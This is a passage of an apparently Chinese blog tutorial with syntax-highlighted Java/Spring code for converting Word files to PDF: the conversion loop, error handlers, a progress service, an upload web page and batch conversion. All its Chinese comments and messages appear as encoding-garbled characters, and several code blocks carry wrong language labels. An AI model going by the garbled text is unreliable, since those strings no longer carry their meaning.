            <span class="hljs-keyword">for</span> (XWPFParagraph para : document.getParagraphs()) {
                <span class="hljs-keyword">if</span> (para.getText().trim().isEmpty()) <span class="hljs-keyword">continue</span>;
                
                <span class="hljs-comment">// å¤„ç†æ–‡æœ¬æ ·å¼</span>
                <span class="hljs-type">Font</span> <span class="hljs-variable">font</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>();
                <span class="hljs-keyword">if</span> (para.getStyle() != <span class="hljs-literal">null</span>) {
                    <span class="hljs-keyword">switch</span> (para.getStyle()) {
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"Heading1"</span>:
                            font = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(Font.HELVETICA, <span class="hljs-number">18</span>, Font.BOLD);
                            <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"Heading2"</span>:
                            font = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(Font.HELVETICA, <span class="hljs-number">16</span>, Font.BOLD);
                            <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">default</span>:
                            font = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(Font.HELVETICA, <span class="hljs-number">12</span>, Font.NORMAL);
                    }
                }
                
                <span class="hljs-type">Paragraph</span> <span class="hljs-variable">pdfPara</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Paragraph</span>(para.getText(), font);
                pdfDocument.add(pdfPara);
                pdfDocument.add(Chunk.NEWLINE);  <span class="hljs-comment">// åŠ ä¸ªæ¢è¡Œï¼Œå–˜å£æ°”</span>
            }
            
            <span class="hljs-comment">// 4. å¤„ç†å›¾ç‰‡ï¼ˆæœ€éš¾æ¬å®¶çš„éƒ¨åˆ†ï¼‰</span>
            System.out.println(<span class="hljs-string">"å¼€å§‹å¤„ç†å›¾ç‰‡ï¼Œå…±"</span> + document.getAllPictures().size() + <span class="hljs-string">"å¼ ..."</span>);
            <span class="hljs-keyword">for</span> (XWPFPictureData picture : document.getAllPictures()) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">byte</span>[] pictureData = picture.getData();
                    <span class="hljs-type">Image</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> Image.getInstance(pictureData);
                    image.scaleToFit(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>);  <span class="hljs-comment">// ç»™å›¾ç‰‡ä¸Šä¸ªç´§ç®å’’ï¼Œåˆ«å¤ªå¤§</span>
                    image.setAlignment(Element.ALIGN_CENTER);
                    pdfDocument.add(image);
                    pdfDocument.add(Chunk.NEWLINE);
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    System.err.println(<span class="hljs-string">"å›¾ç‰‡"</span> + picture.getFileName() + <span class="hljs-string">"å¤ªè°ƒçš®ï¼Œè½¬æ¢å¤±è´¥: "</span> + e.getMessage());
                }
            }
            
            <span class="hljs-comment">// 5. å¤„ç†è¡¨æ ¼ï¼ˆExcelè¡¨ç¤ºï¼šæˆ‘ä¹Ÿæƒ³æ¥å‡‘çƒ­é—¹ï¼‰</span>
            <span class="hljs-keyword">for</span> (XWPFTable table : document.getTables()) {
                com.lowagie.text.<span class="hljs-type">Table</span> <span class="hljs-variable">pdfTable</span> <span class="hljs-operator">=</span> 
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.lowagie.text.Table(table.getNumberOfRows());
                
                <span class="hljs-keyword">for</span> (XWPFTableRow row : table.getRows()) {
                    <span class="hljs-keyword">for</span> (XWPFTableCell cell : row.getTableCells()) {
                        pdfTable.addCell(cell.getText());
                    }
                }
                pdfDocument.add(pdfTable);
            }
            
            pdfDocument.close();
            document.close();
            
            System.out.println(<span class="hljs-string">"è½¬æ¢å®Œæˆï¼ç”ŸæˆPDFå¤§å°: "</span> + 
                (pdfOutputStream.size() / <span class="hljs-number">1024</span>) + <span class="hljs-string">" KB"</span>);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"è½¬æ¢è¿‡ç¨‹å‡ºç°æ„å¤–: "</span> + e.getMessage());
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"è½¬æ¢å¤±è´¥ï¼ŒWordæ–‡æ¡£å¯èƒ½è¢«æ–½äº†é­”æ³•"</span>, e);
        }
        
        <span class="hljs-keyword">return</span> pdfOutputStream.toByteArray();
    }
}
</code></pre>
<h3 data-id="heading-7">3. å¼‚å¸¸å¤„ç†ï¼ˆå˜å½¢å¤±è´¥çš„æ•‘æŠ¤è½¦ï¼‰</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentConversionExceptionHandler</span> {
    
    <span class="hljs-meta">@ExceptionHandler</span>(<span class="hljs-type">IOException</span>.class)
    <span class="hljs-keyword">public</span> <span class="hljs-type">ResponseEntity</span>&lt;<span class="hljs-type">String</span>&gt; handleIOException(<span class="hljs-type">IOException</span> e) {
        <span class="hljs-keyword">return</span> <span class="hljs-type">ResponseEntity</span>.status(<span class="hljs-type">HttpStatus</span>.<span class="hljs-type">INTERNAL_SERVER_ERROR</span>)
            .body(<span class="hljs-string">"æ–‡æ¡£è½¬æ¢å¤±è´¥ï¼Œå¯èƒ½åŸå› ï¼š<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"1. Wordæ–‡æ¡£è¢«å¤–æ˜ŸäººåŠ å¯†äº†<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"2. æ–‡ä»¶å¤ªå¤§ï¼ŒæœåŠ¡å™¨ä¸¾ä¸åŠ¨äº†<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"3. ç½‘ç»œè¿æ¥åœ¨æ‰“çŒç¡<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"é”™è¯¯è¯¦æƒ…: "</span> <span class="hljs-operator">+</span> e.getMessage());
    }
    
    <span class="hljs-meta">@ExceptionHandler</span>(<span class="hljs-type">InvalidFormatException</span>.class)
    <span class="hljs-keyword">public</span> <span class="hljs-type">ResponseEntity</span>&lt;<span class="hljs-type">String</span>&gt; handleInvalidFormat(<span class="hljs-type">Exception</span> e) {
        <span class="hljs-keyword">return</span> <span class="hljs-type">ResponseEntity</span>.badRequest()
            .body(<span class="hljs-string">"å–‚ï¼ä½ ä¸Šä¼ çš„æ˜¯Wordæ–‡æ¡£å—ï¼Ÿ<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"æˆ‘çŒœä½ ä¸Šä¼ çš„æ˜¯ï¼š<span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"â–¡ çŒ«å’ªå›¾ç‰‡ <span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"â–¡ Excelè¡¨æ ¼ <span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"â–¡ å¿ƒçµé¸¡æ±¤æ–‡æœ¬ <span class="hljs-subst">\n</span>"</span> <span class="hljs-operator">+</span>
                  <span class="hljs-string">"è¯·ä¸Šä¼ æ­£ç»çš„.docxæˆ–.docæ–‡ä»¶ï¼"</span>);
    }
}
</code></pre>
<h3 data-id="heading-8">4. è¿›åº¦ç›‘æ§ï¼ˆå˜å½¢è¿‡ç¨‹ç›´æ’­ï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConversionProgressService</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; progressMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">startConversion</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fileId</span>) {
        progressMap.<span class="hljs-title function_">put</span>(fileId, <span class="hljs-number">0</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"å¼€å§‹è½¬æ¢æ–‡ä»¶: "</span> + fileId);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateProgress</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fileId, int percent</span>) {
        progressMap.<span class="hljs-title function_">put</span>(fileId, percent);
        
        <span class="hljs-comment">// æ‰“å°è¿›åº¦æ¡ï¼ˆå‡è£…å¾ˆé«˜çº§ï¼‰</span>
        <span class="hljs-title class_">StringBuilder</span> progressBar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"["</span>);
        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {
            progressBar.<span class="hljs-title function_">append</span>(i * <span class="hljs-number">5</span> &lt; percent ? <span class="hljs-string">"â–ˆ"</span> : <span class="hljs-string">"â–‘"</span>);
        }
        progressBar.<span class="hljs-title function_">append</span>(<span class="hljs-string">"] "</span>).<span class="hljs-title function_">append</span>(percent).<span class="hljs-title function_">append</span>(<span class="hljs-string">"%"</span>);
        
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(fileId + <span class="hljs-string">" è½¬æ¢è¿›åº¦: "</span> + progressBar.<span class="hljs-title function_">toString</span>());
        
        <span class="hljs-comment">// è¯´ç‚¹éªšè¯é¼“åŠ±ä¸€ä¸‹</span>
        <span class="hljs-keyword">if</span> (percent == <span class="hljs-number">50</span>) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"è½¬æ¢è¿‡åŠï¼ŒåšæŒä½ï¼"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (percent == <span class="hljs-number">90</span>) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"é©¬ä¸Šå®Œæˆï¼Œå‡†å¤‡å‘å°„PDFï¼"</span>);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">completeConversion</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fileId</span>) {
        progressMap.<span class="hljs-title function_">remove</span>(fileId);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(fileId + <span class="hljs-string">" è½¬æ¢å®Œæˆï¼Œæ·±è—åŠŸä¸å~"</span>);
    }
}
</code></pre>
<h2 data-id="heading-9">å‰ç«¯è°ƒç”¨ç¤ºä¾‹ï¼ˆç”¨æˆ·æ“ä½œç•Œé¢ï¼‰</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Wordè½¬PDFå˜å½¢å·¥åŠ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Comic Sans MS'</span>, cursive; <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>; }
        <span class="hljs-selector-class">.container</span> { <span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>; <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto; }
        <span class="hljs-selector-class">.drop-zone</span> {
            <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> dashed <span class="hljs-number">#4CAF50</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#f9f9f9</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
        }
        <span class="hljs-selector-class">.drop-zone</span><span class="hljs-selector-pseudo">:hover</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#e8f5e9</span>; }
        <span class="hljs-selector-class">.convert-btn</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">45deg</span>, <span class="hljs-number">#FF6B6B</span>, <span class="hljs-number">#4ECDC4</span>);
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span> <span class="hljs-number">30px</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">25px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
        }
        <span class="hljs-selector-class">.progress-bar</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#ddd</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">overflow</span>: hidden;
            <span class="hljs-attribute">display</span>: none;
        }
        <span class="hljs-selector-class">.progress-fill</span> {
            <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#4CAF50</span>, <span class="hljs-number">#8BC34A</span>);
            <span class="hljs-attribute">width</span>: <span class="hljs-number">0%</span>;
            <span class="hljs-attribute">transition</span>: width <span class="hljs-number">0.3s</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Wordè½¬PDFå˜å½¢å·¥åŠ<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æŠŠä½ çš„Wordæ–‡æ¡£æ‰”è¿›æ¥ï¼Œè¿˜ä½ ä¸€ä¸ªä¹–å·§çš„PDFï¼<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"drop-zone"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dropZone"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æ‹–æ‹½Wordæ–‡ä»¶åˆ°è¿™é‡Œ<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æˆ–è€… <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: #2196F3; cursor: pointer;"</span>&gt;</span>ç‚¹å‡»é€‰æ‹©æ–‡ä»¶
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"fileInput"</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">".docx,.doc"</span> <span class="hljs-attr">hidden</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"convert-btn"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"convertToPdf()"</span>&gt;</span>
            å¼€å§‹å˜å½¢ï¼
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"progressBar"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-fill"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"progressFill"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-top: 20px;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> dropZone = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'dropZone'</span>);
        <span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'fileInput'</span>);
        <span class="hljs-keyword">let</span> selectedFile = <span class="hljs-literal">null</span>;
        
        <span class="hljs-comment">// æ‹–æ‹½åŠŸèƒ½</span>
        dropZone.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'dragover'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            e.<span class="hljs-title function_">preventDefault</span>();
            dropZone.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'#e8f5e9'</span>;
        });
        
        dropZone.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'drop'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            e.<span class="hljs-title function_">preventDefault</span>();
            dropZone.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'#f9f9f9'</span>;
            selectedFile = e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                <span class="hljs-string">`å·²é€‰æ‹©: &lt;strong&gt;<span class="hljs-subst">${selectedFile.name}</span>&lt;/strong&gt;`</span>;
        });
        
        fileInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            selectedFile = e.<span class="hljs-property">target</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                <span class="hljs-string">`å·²é€‰æ‹©: &lt;strong&gt;<span class="hljs-subst">${selectedFile.name}</span>&lt;/strong&gt;`</span>;
        });
        
        <span class="hljs-comment">// è½¬æ¢å‡½æ•°</span>
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">convertToPdf</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">if</span> (!selectedFile) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è¯·å…ˆé€‰æ‹©ä¸€ä¸ªWordæ–‡ä»¶ï¼'</span>);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
            formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'file'</span>, selectedFile);
            
            <span class="hljs-comment">// æ˜¾ç¤ºè¿›åº¦æ¡</span>
            <span class="hljs-keyword">const</span> progressBar = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'progressBar'</span>);
            <span class="hljs-keyword">const</span> progressFill = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'progressFill'</span>);
            progressBar.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;
            
            <span class="hljs-comment">// æ¨¡æ‹Ÿè¿›åº¦ï¼ˆå®é™…é¡¹ç›®å¯ä»¥ç”¨WebSocketï¼‰</span>
            <span class="hljs-keyword">let</span> progress = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
                progress += <span class="hljs-number">10</span>;
                progressFill.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${progress}</span>%`</span>;
                <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">90</span>) <span class="hljs-built_in">clearInterval</span>(interval);
            }, <span class="hljs-number">300</span>);
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/doc-transform/word-to-pdf'</span>, {
                    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
                    <span class="hljs-attr">body</span>: formData
                });
                
                <span class="hljs-built_in">clearInterval</span>(interval);
                progressFill.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">'100%'</span>;
                
                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) {
                    <span class="hljs-comment">// ä¸‹è½½PDF</span>
                    <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();
                    <span class="hljs-keyword">const</span> url = <span class="hljs-variable language_">window</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);
                    <span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);
                    a.<span class="hljs-property">href</span> = url;
                    a.<span class="hljs-property">download</span> = selectedFile.<span class="hljs-property">name</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.docx?$/i</span>, <span class="hljs-string">'.pdf'</span>);
                    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
                    a.<span class="hljs-title function_">click</span>();
                    a.<span class="hljs-title function_">remove</span>();
                    
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                        <span class="hljs-string">'è½¬æ¢æˆåŠŸï¼PDFå·²å¼€å§‹ä¸‹è½½~'</span>;
                    
                    <span class="hljs-comment">// 3ç§’åé‡ç½®</span>
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                        progressBar.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
                        progressFill.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">'0%'</span>;
                        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">''</span>;
                    }, <span class="hljs-number">3000</span>);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">const</span> errorText = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">text</span>();
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                        <span class="hljs-string">`è½¬æ¢å¤±è´¥: <span class="hljs-subst">${errorText}</span>`</span>;
                }
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                    <span class="hljs-string">`ç½‘ç»œé”™è¯¯: <span class="hljs-subst">${error.message}</span>`</span>;
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-10">é«˜çº§åŠŸèƒ½æ‰©å±•</h2>
<h3 data-id="heading-11">æ‰¹é‡è½¬æ¢ï¼ˆç¾¤å˜æ¨¡å¼ï¼‰</h3>
<pre><code class="hljs language-arduino" lang="arduino">@Service
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BatchConversionService</span> {
    
    @Async  <span class="hljs-comment">// å¼‚æ­¥å¤„ç†ï¼Œä¸å¡ç•Œé¢</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;List&lt;<span class="hljs-built_in">File</span>&gt;&gt; <span class="hljs-built_in">convertMultiple</span>(List&lt;MultipartFile&gt; files) {
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"å¼€å§‹æ‰¹é‡è½¬æ¢ï¼Œå…±"</span> + files.<span class="hljs-built_in">size</span>() + <span class="hljs-string">"ä¸ªæ–‡ä»¶ï¼Œå†²é¸­ï¼"</span>);
        
        List&lt;<span class="hljs-built_in">File</span>&gt; pdfFiles = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        List&lt;CompletableFuture&lt;<span class="hljs-built_in">File</span>&gt;&gt; futures = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; files.<span class="hljs-built_in">size</span>(); i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> index = i;
            CompletableFuture&lt;<span class="hljs-built_in">File</span>&gt; future = CompletableFuture.<span class="hljs-built_in">supplyAsync</span>(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"æ­£åœ¨è½¬æ¢ç¬¬"</span> + (index + <span class="hljs-number">1</span>) + <span class="hljs-string">"ä¸ªæ–‡ä»¶..."</span>);
                    <span class="hljs-type">byte</span>[] pdfBytes = WordToPdfConverter.<span class="hljs-built_in">convert</span>(<span class="hljs-built_in">convertToFile</span>(files.<span class="hljs-built_in">get</span>(index)));
                    <span class="hljs-built_in">File</span> pdfFile = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(<span class="hljs-string">"converted_"</span> + index + <span class="hljs-string">".pdf"</span>);
                    Files.<span class="hljs-built_in">write</span>(pdfFile.<span class="hljs-built_in">toPath</span>(), pdfBytes);
                    <span class="hljs-keyword">return</span> pdfFile;
                } <span class="hljs-built_in">catch</span> (Exception e) {
                    System.err.<span class="hljs-built_in">println</span>(<span class="hljs-string">"ç¬¬"</span> + (index + <span class="hljs-number">1</span>) + <span class="hljs-string">"ä¸ªæ–‡ä»¶è½¬æ¢å¤±è´¥: "</span> + e.<span class="hljs-built_in">getMessage</span>());
                    <span class="hljs-keyword">return</span> null;
                }
            });
            futures.<span class="hljs-built_in">add</span>(future);
        }
        
        <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰è½¬æ¢å®Œæˆ</span>
        CompletableFuture.<span class="hljs-built_in">allOf</span>(futures.<span class="hljs-built_in">toArray</span>(<span class="hljs-keyword">new</span> CompletableFuture[<span class="hljs-number">0</span>])).<span class="hljs-built_in">join</span>();
        
        <span class="hljs-keyword">for</span> (CompletableFuture&lt;<span class="hljs-built_in">File</span>&gt; future : futures) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-built_in">File</span> pdf = future.<span class="hljs-built_in">get</span>();
                <span class="hljs-keyword">if</span> (pdf != null) pdfFiles.<span class="hljs-built_in">add</span>(pdf);
            } <span class="hljs-built_in">catch</span> (Exception e) {
                <span class="hljs-comment">// å¿½ç•¥å¤±è´¥çš„æ–‡ä»¶</span>
            }
        }
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"æ‰¹é‡è½¬æ¢å®Œæˆï¼æˆåŠŸ: "</span> + pdfFiles.<span class="hljs-built_in">size</span>() + 
                          <span class="hljs-string">"/"</span> + files.<span class="hljs-built_in">size</span>() + <span class="hljs-string">" ä¸ªæ–‡ä»¶"</span>);
        <span class="hljs-keyword">return</span> CompletableFuture.<span class="hljs-built_in">completedFuture</span>(pdfFiles);
